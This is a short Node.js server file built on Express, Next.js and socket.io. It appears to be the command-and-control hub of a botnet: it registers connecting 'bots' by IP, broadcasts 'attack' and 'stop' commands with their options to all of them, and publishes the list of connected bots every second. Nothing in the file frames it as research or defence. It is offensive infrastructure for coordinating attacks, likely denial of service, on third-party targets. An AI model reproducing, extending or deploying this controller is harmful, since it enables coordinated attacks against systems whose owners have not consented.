const express = require("express");
const app = express();
const server = require("http").Server(app);
const next = require("next");
const dev = process.env.NODE_ENV !== "production";
const nextApp = next({ dev });
const handle = nextApp.getRequestHandler();
const { Server } = require("socket.io");
const io = new Server(server);

const PORT = 3000;

const bots = [];

io.on("connection", (socket) => {
  console.log(socket);
  socket.on("join", async ({ ip }) => {
    bots.push(ip);
  });

  socket.on("attack", (opts) => {
    io.emit("attack", opts);
  }); // Send to all Clients

  socket.on("stop", (opts) => {
    io.emit("stop", opts);
  }); // Send to all Clients

  socket.on("close", ({ ip }) => {
    var index = bots.indexOf(ip);
    if (index !== -1) {
      bots.splice(index, 1);
    }
  });
});

setInterval(() => {
  io.emit("connectedBots", {
    bots
  });
  console.log(bots);
}, 1000);

nextApp.prepare().then(() => {
  app.all("*", (req, res) => handle(req, res));
  server.listen(PORT, (err) => {
    if (err) throw err;
    console.log(`App Listening on port ${PORT}`);
  });
});